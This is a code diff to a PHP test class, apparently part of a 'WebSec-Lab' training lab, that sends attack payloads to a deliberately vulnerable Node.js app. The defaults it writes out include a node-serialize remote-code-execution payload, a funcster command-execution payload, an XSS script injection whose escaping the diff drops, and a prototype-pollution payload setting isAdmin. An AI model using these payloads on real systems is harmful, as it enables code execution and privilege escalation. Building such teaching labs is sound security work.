@@ -572,7 +572,7 @@ class AdvancedDeserializationTest {
     }
     
     private function callNodeJsAPI($payload_type, $custom_payload = '') {
-        $api_url = 'http://localhost:3001/api/';
+        $api_url = 'http://vulnerability_node_app:3000/nodejs/';
         $timeout = 10; // 10초 타임아웃
         
         try {
@@ -581,41 +581,44 @@ class AdvancedDeserializationTest {
             
             switch ($payload_type) {
                 case 'node_serialize':
-                    $endpoint = 'node-serialize';
-                    $payload = $custom_payload ?: '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc.exe\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
+                    $endpoint = 'node_serialize';
+                    $payload = $custom_payload ?: '{"username":"admin","rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'calc.exe\', function(error, stdout, stderr) { console.log(stdout) });}()"}';
                     $post_data = [
-                        'payload' => $payload,
-                        'mode' => 'vulnerable'
+                        'payload' => $payload
                     ];
                     break;
                     
                 case 'serialize_javascript':
-                    $endpoint = 'serialize-javascript';
+                    $endpoint = 'serialize_javascript';
                     $data = $custom_payload ? json_decode($custom_payload, true) : [
-                        'name' => htmlspecialchars('</script><script>alert("XSS from WebSec-Lab")</script>'),
+                        'name' => '</script><script>alert("XSS from WebSec-Lab")</script>',
                         'data' => 'malicious content'
                     ];
                     $post_data = [
-                        'data' => $data,
-                        'mode' => 'vulnerable'
+                        'data' => $data
                     ];
                     break;
                     
                 case 'funcster':
                     $endpoint = 'funcster';
-                    $serialized_func = $custom_payload ?: 'function() { require("child_process").exec("whoami"); }';
+                    $function_code = $custom_payload ?: 'function() { return require("child_process").execSync("whoami").toString(); }';
                     $post_data = [
-                        'serializedFunction' => $serialized_func,
-                        'mode' => 'vulnerable'
+                        'functionCode' => $function_code
                     ];
                     break;
                     
                 case 'cryo':
-                    $endpoint = 'cryo';
-                    $frozen_data = $custom_payload ?: '{"__proto__":{"polluted":"yes","isAdmin":true,"compromised":"WebSec-Lab"},"normalData":"hello"}';
+                    $endpoint = 'advanced_prototype_pollution';
+                    $payload_data = $custom_payload ? json_decode($custom_payload, true) : [
+                        '__proto__' => [
+                            'polluted' => 'yes',
+                            'isAdmin' => true,
+                            'compromised' => 'WebSec-Lab'
+                        ],
+                        'normalData' => 'hello'
+                    ];
                     $post_data = [
-                        'frozenData' => $frozen_data,
-                        'mode' => 'vulnerable'
+                        'payload' => $payload_data
                     ];
                     break;
                     
